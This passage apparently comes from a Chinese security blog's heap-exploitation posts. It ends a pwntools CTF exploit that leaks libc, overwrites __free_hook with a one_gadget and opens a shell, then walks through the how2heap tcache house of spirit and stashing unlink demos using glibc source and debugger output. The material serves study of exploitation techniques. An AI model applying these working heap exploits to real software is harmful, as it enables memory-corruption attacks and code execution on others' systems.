class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;null-byte-overflow&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0x10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line">main_arean=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">malloc_hook=main_arean-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;main_arean&#x27;</span>,main_arean)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base=malloc_hook-libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)+base))</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;fuck&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">one_gadget=base+<span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">6</span>)  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Off By One </tag>
            
            <tag> Free Hook </tag>
            
            <tag> Null Byte Overflow </tag>
            
            <tag> Overlapping Heap Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache house of spirit &amp;&amp; Tcache stashing unlink attack</title>
      <link href="/2023/03/27/Tcache_house_of_spirit-unlink/"/>
      <url>/2023/03/27/Tcache_house_of_spirit-unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-house-of-spirit"><a href="#Tcache-house-of-spirit" class="headerlink" title="Tcache house of spirit"></a>Tcache house of spirit</h2><p>how2heap tcache_house_of_spirit.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Starting program: /mnt/hgfs/Share/how2heap/glibc_2<span class="number">.27</span>/tcache_house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack on tcache.</span><br><span class="line">It works in a similar way to original house of spirit but you don<span class="number">&#x27;</span>t need to create fake chunk after the fake chunk that will be freed.</span><br><span class="line">You can see this in <span class="built_in">malloc</span>.c in function _int_free that tcache_put is called without checking <span class="keyword">if</span> next chunk<span class="number">&#x27;</span>s size and prev_inuse are sane.</span><br><span class="line">(Search <span class="keyword">for</span> strings <span class="string">&quot;invalid next size&quot;</span> and <span class="string">&quot;double free or corruption&quot;</span>)</span><br><span class="line"></span><br><span class="line">Ok. Let<span class="number">&#x27;</span>s start with the example!.</span><br><span class="line"></span><br><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffdee8</span><br><span class="line">This chunk size has to be falling into the tcache <span class="title function_">category</span> <span class="params">(chunk.size &lt;= <span class="number">0x410</span>; <span class="built_in">malloc</span> arg &lt;= <span class="number">0x408</span> on x64)</span>. The <span class="title function_">PREV_INUSE</span> <span class="params">(lsb)</span> bit is ignored by <span class="built_in">free</span> <span class="keyword">for</span> tcache chunks, however the <span class="title function_">IS_MMAPPED</span> <span class="params">(second lsb)</span> and <span class="title function_">NON_MAIN_ARENA</span> <span class="params">(third lsb)</span> bits cause problems.</span><br><span class="line">... note that this has to be the size of the next <span class="built_in">malloc</span> request rounded to the internal size used by the <span class="built_in">malloc</span> implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the <span class="built_in">malloc</span> parameter at the end.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdee8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffdee8, which will be 0x7fffffffdef0!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffdef0</span><br><span class="line">[Inferior 1 <span class="params">(process <span class="number">6552</span>)</span> exited normally]</span><br></pre></td></tr></table></figure><p>额，比fastbin简单多了</p><p>伪造完成</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327160459074.png" alt="image-20230327160459074"></p><h2 id="Tcache-stashing-unlink-attack"><a href="#Tcache-stashing-unlink-attack" class="headerlink" title="Tcache stashing unlink attack"></a>Tcache stashing unlink attack</h2><p>how2heap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">This file demonstrates the stashing unlink attack on tcache.</span><br><span class="line"></span><br><span class="line">This poc has been tested on both glibc <span class="number">2.27</span> and glibc <span class="number">2.29</span>.</span><br><span class="line"></span><br><span class="line">This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it<span class="number">&#x27;</span>s necessary to alloc a chunk with <span class="built_in">calloc</span> at least once. Last not least, we need a writable address to bypass check in glibc</span><br><span class="line"></span><br><span class="line">The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.</span><br><span class="line"></span><br><span class="line">This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this <span class="keyword">case</span> we<span class="number">&#x27;ll</span> create the chunk on the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">Stack_var emulates the fake chunk we want to alloc to.</span><br><span class="line"></span><br><span class="line">First let<span class="number">&#x27;</span>s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[<span class="number">2</span>] as the fake bk. Later we can see *(fake_chunk-&gt;bk + <span class="number">0x10</span>) which is stack_var[<span class="number">4</span>] will be a libc addr after attack.</span><br><span class="line"></span><br><span class="line">You can see the value of fake_chunk-&gt;bk is:<span class="number">0x7fffffffde30</span></span><br><span class="line"></span><br><span class="line">Also, let<span class="number">&#x27;</span>s see the initial value of stack_var[<span class="number">4</span>]:(nil)</span><br><span class="line"></span><br><span class="line">Now we alloc <span class="number">9</span> chunks with <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">free</span> <span class="number">7</span> of them in order to put them into tcache. Carefully we didn<span class="number">&#x27;</span>t <span class="built_in">free</span> a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins <span class="keyword">while</span> chunk0 and chunk2 will be put into unsorted bin.</span><br><span class="line"></span><br><span class="line">Now we alloc a chunk larger than <span class="number">0x90</span> to put chunk0 and chunk2 into small bin.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">malloc</span> two chunks to spare space <span class="keyword">for</span> small bins. After that, we now have <span class="number">5</span> tcache bins and <span class="number">2</span> small bins</span><br><span class="line"></span><br><span class="line">Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: <span class="number">0x7fffffffde20</span>.</span><br><span class="line"></span><br><span class="line">Finally we alloc a <span class="number">0x90</span> chunk with <span class="built_in">calloc</span> to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.</span><br><span class="line"></span><br><span class="line">Now our fake chunk has been put into tcache bin[<span class="number">0xa0</span>] <span class="built_in">list</span>. Its fd pointer now point to next <span class="built_in">free</span> chunk: <span class="number">0x6033a0</span> and the bck-&gt;fd has been changed into a libc addr: <span class="number">0x7ffff7dcdd30</span></span><br><span class="line"></span><br><span class="line">As you can see, next <span class="built_in">malloc</span>(<span class="number">0x90</span>) will <span class="keyword">return</span> the region our fake chunk: <span class="number">0x7fffffffde30</span></span><br></pre></td></tr></table></figure><p><strong>tcache有剩余时，small bin下一次malloc时会按照bk指向放入合适tcachebin，在这个过程中只对第一个 bin 进行了完整性检查__glibc_unlikely (bck-&gt;fd !&#x3D; victim)，后面的堆块的检查缺失</strong></p><p><strong>calloc不会在tcachebin里申请内存</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffde20</span></span><br><span class="line">&amp;chunk_lis</span><br><span class="line"><span class="number">0x7fffffffdea0</span></span><br><span class="line">&amp;target</span><br><span class="line"><span class="number">0x7fffffffde18</span></span><br></pre></td></tr></table></figure><ol><li><p>stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);即0x7fffffffde38写入0x7fffffffde30，具体为什么这样后面解释</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234406124.png" alt="image-20230327234406124"></p></li><li><p>先malloc了0xa0(malloc arg&#x3D;0x90)大小的九个堆，我们叫他chunk0-8把</p></li><li><p>把chunk3-chunk8释放掉进入tcachebin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232412518.png" alt="image-20230327232412518" style="zoom:80%;"></li><li><p><code>free(chunk_lis[1]);</code>后0xa0tcachebin满7个，<code>free(chunk_lis[0]);free(chunk_lis[2]);</code>会进入unsorted bin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232958585.png" alt="image-20230327232958585" style="zoom:80%;"></li><li><p><code>malloc(0xa0);</code>没有合适大小chunk，重新分配一个，但是会触发unsortedbin分类操作，tcache满了，0xa0大小chunk会进入small bin里</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233240585.png" alt="image-20230327233240585" style="zoom: 80%;"></li><li><p><code>malloc(0x90);malloc(0x90);</code>把tcache前两个申请出来</p></li></ol>   <img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233621133.png" alt="image-20230327233621133" style="zoom:80%;"><ol start="7"><li><p><code> chunk_lis[2][1] = (unsigned long)stack_var;</code>把chunk2的bk指针改为&amp;stack_var&#x3D;0x7fffffffde20</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233912304.png" alt="image-20230327233912304"></p></li><li><p><code>calloc(1,0x90);</code>FIFO原则，会从smallbin拿走chunk0，这时候tcache有空位，会把small bin里的东西给移到tcachebin</p><p>看下源码怎么从small bin把chunk0拿走的的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 若结果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="keyword">if</span> ( ( victim = last (bin) ) != bin )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">        <span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>对chunk0进行bck就是chunk2,victim是chunk0，bck-&gt;fd !&#x3D; victim检测chunk2没有破坏fd指针，绕过，其余没有其他检测bk指针的code， 之后进行unlink操作bin-&gt;bk &#x3D; bck; bck-&gt;fd &#x3D; bin;继续构成循环链表</p><p>看下源码把其余chunk放入tcache bin的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取size对应的tcache索引</span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span></span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//如果tcache bin没有满</span></span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//并且small bin不为空,tc_victim为small bin中的最后一个堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;<span class="comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span></span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;<span class="comment">//将tc_victim从small bin中脱链</span></span><br><span class="line">              bck-&gt;fd = bin;<span class="comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span></span><br><span class="line">              tcache_put (tc_victim, tc_idx);<span class="comment">//将tc_victim链入tc_idx这条链</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没有bck-&gt;fd !&#x3D; victim的验证所以我们伪造的chunk不需要伪造fd，这个时候还是先进行unlink操作，第一次是对chunk2进行unlinke，bck为chunk 0x7fffffffde20，bck-&gt;fd&#x3D;bin会在0x7fffffffde30写入bin(small bin)，<strong>这就需要我们首先保证这个伪造地址的bk的fd是可写的</strong></p><p>可以下个条件断点看下 watch *(long *)0x7fffffffde30 </p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328012821048.png" alt="image-20230328012821048" style="zoom:80%;"><p>第二次对伪造chunk 0x7fffffffde20进行unlinke bck为之前<strong>第1步</strong>*伪造的0x7fffffffde30，会在0x7fffffffde40写入bin(small bin)</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013130739.png" alt="image-20230328013130739"></p><p>为什么这里0x7fffffffde30不是small bin了呢？是因为被tcache_put (tc_victim, tc_idx)把0x7fffffffde20链入tcachebin时改写了0x7fffffffde30处的next指针</p><p>条件断点看下就可以</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013046989.png" alt="image-20230328013046989"></p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234506290.png" alt="image-20230327234506290" 